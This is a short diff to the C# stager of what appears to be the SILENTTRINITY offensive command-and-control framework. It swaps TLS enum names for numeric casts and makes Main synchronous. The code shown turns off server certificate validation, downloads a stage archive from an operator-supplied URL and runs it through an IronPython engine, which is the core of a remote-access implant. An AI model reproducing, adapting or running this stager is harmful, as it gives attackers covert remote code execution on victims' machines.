@@ -13,14 +13,14 @@ namespace SILENTTRINITY
         static ST()
         {
             ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072;
 
             AppDomain.CurrentDomain.AssemblyResolve += STResolveEventHandler;
         }
 
         static ZipStorer Stage;
 
-        public static async Task Main(string[] args)
+        public static void Main(string[] args)
         {
             if (args.Length != 1)
             {
@@ -36,7 +36,7 @@ namespace SILENTTRINITY
             Console.WriteLine();
 #endif
 
-            Stage = ZipStorer.Open(await Engines.IronPython.GetStage(URL),FileAccess.ReadWrite, true);
+            Stage = ZipStorer.Open(Engines.IronPython.GetStage(URL), FileAccess.ReadWrite, true);
 
             Engines.IronPython.Run(URL, GUID, Stage);
         }
